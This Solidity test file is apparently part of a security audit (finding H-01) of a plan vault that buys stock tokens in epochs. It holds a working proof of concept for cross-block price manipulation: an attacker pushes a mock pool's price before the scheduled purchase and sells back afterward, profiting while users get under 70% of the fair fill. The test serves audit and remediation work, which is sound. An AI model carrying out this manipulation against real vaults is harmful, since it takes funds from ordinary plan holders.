// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {AuditBase} from "../AuditBase.sol";
import {CPMMPool, Trader} from "../mocks/CPMMPool.sol";
import {IPlanVault} from "../../../src/interfaces/IPlanVault.sol";

/// @dev AUDIT v0.3 / H-01. Epoch purchases have no manipulation-resistant price reference. Every number the
///      vault checks (router quote, minOut = quote x 0.995, impact vs slot0) is read in the executing block, so an
///      attacker who pre-positions in an EARLIER block (no same-block ordering needed, no mempool needed) and
///      unwinds after the fill takes value from every plan on the page. Epoch timing is public and predictable.
contract Audit3_H01_PriceManipulation is AuditBase {
    CPMMPool internal pool;
    Trader internal attacker;
    uint256[] internal ids;
    uint256 internal constant PER_EPOCH = 5_000e6;

    function setUp() public override {
        super.setUp();
        // $2M USDG / 4,000 NVDA constant-product pool at 500 USDG per NVDA, 5 bps fee: a realistic mid-size pool
        // (a 15k page has ~0.8% impact here; in a $1M pool the same page is already OVER the 150 bps cap).
        pool = _cpmmPool(address(usdg), 2_000_000e6, address(nvda), 4_000e18, 500);
        attacker = new Trader();
        usdg.mint(address(attacker), 3_000_000e6);
        address[3] memory users = [alice, bob, carol];
        for (uint256 i; i < 3; ++i) {
            vm.prank(users[i]);
            ids.push(daily.createPlan(address(nvda), uint96(PER_EPOCH), address(0), 50_000e6, 0, 0, false));
        }
    }

    function _totalAccrued() internal view returns (uint256 t) {
        for (uint256 i; i < ids.length; ++i) {
            t += _plan(ids[i]).stockAccrued;
        }
    }

    /// Block N: attacker buys NVDA. Block N+1: operator runs the scheduled epoch (auto-route, no override).
    /// Block N+2: attacker sells back. The page's own impact stays under the 150 bps cap because the cap is
    /// measured against the ALREADY PUSHED spot price.
    function test_crossBlockManipulation_takesValueFromEveryPlanOnThePage() public {
        _nextEpoch();
        uint256 amountIn = (3 * PER_EPOCH * (10_000 - 75)) / 10_000; // page net of the 75 bps purchase fee

        // Baseline: the fair fill.
        uint256 snap = vm.snapshotState();
        _advance(keeper);
        uint256 fairOut = _totalAccrued();
        vm.revertToState(snap);

        bool buyNvda = address(usdg) == pool.token0();
        uint256 push = 600_000e6;

        // Block N.
        uint256 nvdaHeld = attacker.trade(pool, buyNvda, push);

        // Block N+1: the vault's own checks all pass.
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        (uint256 quoted,, uint256 impact) = router.quoteWithImpact(address(usdg), address(nvda), amountIn);
        assertLe(impact, router.maxPriceImpactBps(), "impact cap passes against the pushed mid");
        assertGt(quoted, 0);
        _advance(keeper);
        uint256 manipulatedOut = _totalAccrued();

        // Block N+2.
        vm.roll(block.number + 1);
        uint256 usdgBack = attacker.trade(pool, !buyNvda, nvdaHeld);

        emit log_named_uint("fair NVDA (1e18)", fairOut);
        emit log_named_uint("manipulated NVDA (1e18)", manipulatedOut);
        emit log_named_uint("attacker profit USDG (1e6)", usdgBack - push);

        assertGt(usdgBack, push, "attacker nets a profit");
        assertLt(manipulatedOut * 100, fairOut * 70, "users receive < 70% of the fair fill");
    }

    /// The same pre-positioning cannot be detected by the cap regardless of its size: the cap bounds the page's
    /// slippage relative to the current pool state, never the distance of that state from a reference price.
    function test_impactCapIsBlindToThePushSize() public {
        _nextEpoch();
        uint256 amountIn = (3 * PER_EPOCH * (10_000 - 75)) / 10_000;
        bool buyNvda = address(usdg) == pool.token0();
        uint256[3] memory pushes = [uint256(100_000e6), 500_000e6, 2_000_000e6];
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            attacker.trade(pool, buyNvda, pushes[i]);
            vm.roll(block.number + 1);
            (,, uint256 impact) = router.quoteWithImpact(address(usdg), address(nvda), amountIn);
            assertLe(impact, router.maxPriceImpactBps());
            assertTrue(_advance(keeper), "page fills at whatever price the pool was left at");
            vm.revertToState(snap);
        }
    }
}
